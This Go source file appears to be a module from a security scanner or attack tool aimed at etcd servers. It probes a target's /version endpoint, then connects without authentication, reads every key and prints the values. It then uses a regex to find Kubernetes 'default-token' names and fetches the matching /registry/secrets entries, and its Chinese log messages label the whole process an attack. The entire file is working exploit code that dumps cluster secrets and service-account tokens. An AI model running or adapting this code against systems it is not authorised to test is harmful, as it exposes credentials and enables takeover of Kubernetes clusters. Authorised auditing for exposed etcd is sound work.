package etcd

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"regexp"
	"strings"
	"time"

	"go.etcd.io/etcd/client/v3"
)

func EtcdGetToken(ip string, port int) bool {
	cfg := clientv3.Config{
		Endpoints:   []string{fmt.Sprintf("http://%s:%d", ip, port)},
		DialTimeout: 5 * time.Second,
	}

	client, err := clientv3.New(cfg)
	if err != nil {
		log.Printf("etcd:%s:%d连接失败: %v", ip, port, err)
		return false
	}
	defer client.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	resp, err := client.Get(ctx, "", clientv3.WithPrefix())
	if err != nil {
		log.Printf("etcd攻击失败: %v", err)
		return false
	}

	for _, kv := range resp.Kvs {
		if kv.Value != nil {
			log.Println("etcd存在未授权访问")
			log.Println(string(kv.Value))
			if strings.Contains(string(kv.Value), "default-token") {
				re := regexp.MustCompile(`default-token-\w{1,5}`)
				tokens := re.FindAllString(string(kv.Value), -1)
				if len(tokens) > 0 {
					token := tokens[0]
					log.Printf("发现token: %s", token)
					log.Println("尝试获取对应的/registry/secrets/default/token信息")
					tokenResp, err := client.Get(ctx, fmt.Sprintf("/registry/secrets/default/%s", token))
					if err != nil {
						log.Printf("获取token信息失败: %v", err)
						continue
					}
					log.Printf("对应的/registry/secrets/default/token信息数据为: %v", tokenResp.Kvs)
				}
			}
		}
	}

	return true
}

func Check(targetURL string) bool {
	if !strings.HasPrefix(targetURL, "http") {
		targetURL = "http://" + targetURL
	}

	versionURL := fmt.Sprintf("%s/version", targetURL)
	log.Println(versionURL)

	resp, err := http.Get(versionURL)
	if err != nil {
		log.Printf("地址访问失败: %v", err)
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		log.Println("etcd地址存在/version接口，可以继续执行")
		parts := strings.Split(targetURL, ":")
		etcdIP := parts[1][2:] // Remove "//"
		etcdPort := 2379
		if len(parts) > 2 {
			etcdPort = parsePort(parts[2])
		}
		log.Printf("etcd_ip为: %s", etcdIP)
		log.Printf("etcd_port: %d", etcdPort)

		etcdAttackStatus := EtcdGetToken(etcdIP, etcdPort)
		if etcdAttackStatus {
			log.Printf("%s存在未授权访问攻击", targetURL)
			return true
		} else {
			log.Printf("%s不存在未授权访问攻击", targetURL)
			return false
		}
	} else {
		log.Printf("输入的地址不存在/version接口，结束任务")
		return false
	}
}

func parsePort(portStr string) int {
	var port int
	fmt.Sscanf(portStr, "%d", &port)
	return port
}